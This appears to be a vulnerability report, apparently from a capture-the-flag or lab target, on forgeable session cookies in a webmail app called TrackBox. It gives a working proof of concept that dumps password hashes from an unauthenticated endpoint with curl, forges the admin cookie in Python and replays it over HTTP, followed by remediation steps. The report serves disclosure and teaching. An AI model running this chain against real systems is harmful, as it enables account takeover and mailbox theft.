# Description

Deterministic session token (CWE-340 / CWE-330) on the TrackBox webmail. The authentication cookie `Id` is set to `SHA256(f"{username} + {stored_password_hash}")` (`Backend.py:136-140`) at login time — a deterministic value derived from the username and the stored SHA-256 password hash, not a random one. The token never expires, has no server-side session store, and logout only deletes the client cookie.

An attacker who obtains the stored password hash (available via the unauthenticated `GET /api/users` endpoint) can compute a valid `Id` cookie without knowing the plaintext password.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Dump hashes via `GET /api/users` (unauthenticated). | Obtain the target's `password_hash`. |
| 2 | Compute `SHA256(f"{username} + {password_hash_tuple}")`. | The victim's `Id` cookie value. |
| 3 | Send `Id` + `Username` cookies to any authenticated webmail route. | Full session, no plaintext password needed. |

# PoC

**1. Obtain the stored hash from the unauthenticated API:**

```bash
curl -s "http://webmail.<TARGET>/api/users" | python3 -c "
import json,sys; d=json.load(sys.stdin)
for u in d['users']:
  if u['username']=='admin@tbox.traced': print(u['password_hash'])"
# <admin_password_hash>
```

**2. Compute the deterministic token:**

The cookie derivation in `Backend.py:136-140` is `SHA256(f"{username} + {db.get_user_password(username)}")`, where `get_user_password` returns a SQLite row tuple. Replicate that format to forge the `Id` cookie.

```python
import hashlib
username = "admin@tbox.traced"
pw_row = ("<admin_password_hash>",)  # SQLite row tuple
token = hashlib.sha256(f"{username} + {pw_row}".encode()).hexdigest()
```

**3. Inject the forged cookies:**

```http
GET /client HTTP/2
Host: webmail.<TARGET>
Cookie: Id=<computed_token>; Username=admin@tbox.traced
```

Full inbox access confirmed with no plaintext password.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Any user's inbox readable without credentials, including secrets and password-reset links. |
| Integrity | Admin-inbox access enables password resets across Banking and Django admin → full platform compromise. |
| Availability | Chained with the webmail CSRF (password change / account delete), one visit takes over and destroys an account. |

Overall severity: **Critical** — deterministic, non-expiring token forgeable from the unauthenticated hash dump; chains with the `GET /api/users` finding for password-less session forgery for every account.

# Remediation

1. **Replace the deterministic SHA256 token with a CSPRNG value** generated at login.
2. **Store sessions server-side** (DB / Redis) bound to the authenticated account.
3. **Rotate the session ID** on every auth-state change (login, logout, password change).

# Author
TéléHack
